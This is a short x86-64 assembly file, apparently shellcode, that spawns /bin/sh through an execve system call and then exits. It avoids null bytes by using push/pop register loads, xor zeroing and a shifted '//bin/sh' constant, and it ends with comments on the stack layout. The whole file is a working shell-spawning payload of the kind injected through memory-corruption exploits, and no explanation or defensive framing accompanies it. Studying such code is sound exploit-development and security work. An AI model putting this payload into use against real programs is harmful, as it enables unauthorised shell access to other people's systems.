	.global _start
	.text
sys_exec = 59
_start:
	push $sys_exec						# execve(bin,args,env)
	pop %rax
	xor %rdx, %rdx
	movabs $0x68732f6e69622f2f, %rbx 	# //bin/sh
	shr $0x8, %rbx
	push %rbx
	push %rsp
	pop %rdi
	push %rdx
	push %rdi
	push %rsp
	pop %rsi
	syscall
	push $60							# exit(0)
	pop %rax
	xor %rdi, %rdi
	syscall

										# stack :
										# 1 rdi addr: 3
										# 2 rdx 0
										# 3 rbx /bin/sh
